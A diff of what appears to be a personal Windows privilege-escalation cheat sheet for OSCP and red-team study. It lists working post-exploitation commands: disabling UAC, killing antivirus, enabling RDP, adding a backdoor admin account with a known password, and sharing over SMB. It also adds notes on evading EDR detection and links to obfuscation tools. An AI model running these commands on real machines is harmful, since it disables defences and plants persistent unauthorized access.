@@ -1,8 +1,8 @@
 # Basics
 
-DO NOT RUN `whoami`!!! Some SOARs may detect it and start tracking u!
+## Enum
 
-## Automated enum
+### Automated enum
 
 https://github.com/itm4n/PrivescCheck/
 
@@ -1063,21 +1063,19 @@ Or connect as other service if needed from victim
 # SET UAC TO 0
 C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 
-# TURN OFF ANTIVIRUS
+# TURN OFF ANTIVIRUS (can be detected by EDRs!!! so use with caution!!!)
 run killav
-
-
 
 # enable RDP
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 
-#* add user
+# add user
 net user Pentester Password1 /ADD
 
-#* give admin rights
+# give admin rights
 net localgroup Administrators Pentester /ADD
 
-#* add to RDP group
+# add to RDP group
 
 powershell -nop -c "Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Pentester""
 
@@ -1095,49 +1093,11 @@ winrm quickconfig -y
 
 New-SmbShare -Name "wapa" -Path "C:\wapa"
 
-# control SMB
-
-SMBv1
-Detect:
-
-PowerShell
-
-Copy
-Get-SmbServerConfiguration | Select EnableSMB1Protocol
-Disable:
-
-PowerShell
-
-Copy
-Set-SmbServerConfiguration -EnableSMB1Protocol $false
-Enable:
-
-PowerShell
-
-Copy
-Set-SmbServerConfiguration -EnableSMB1Protocol $true
-For more information, see Server storage at Microsoft.
-
-SMB v2/v3
-Detect:
-
-PowerShell
-
-Copy
-Get-SmbServerConfiguration | Select EnableSMB2Protocol
-Disable:
-
-PowerShell
-
-Copy
-Set-SmbServerConfiguration -EnableSMB2Protocol $false
-Enable:
-
-PowerShell
-
-Copy
-Set-SmbServerConfiguration -EnableSMB2Protocol $true
-
 ```
 
+## Obfuscation
 
+This is not needed for OSCP, but is needed for Red Team engagements.
+
+* Obfuscation in general: https://attack.mitre.org/techniques/T1027/010/
+* Command line obfuscation: https://github.com/wietze/Invoke-ArgFuscator or https://argfuscator.net/about.html
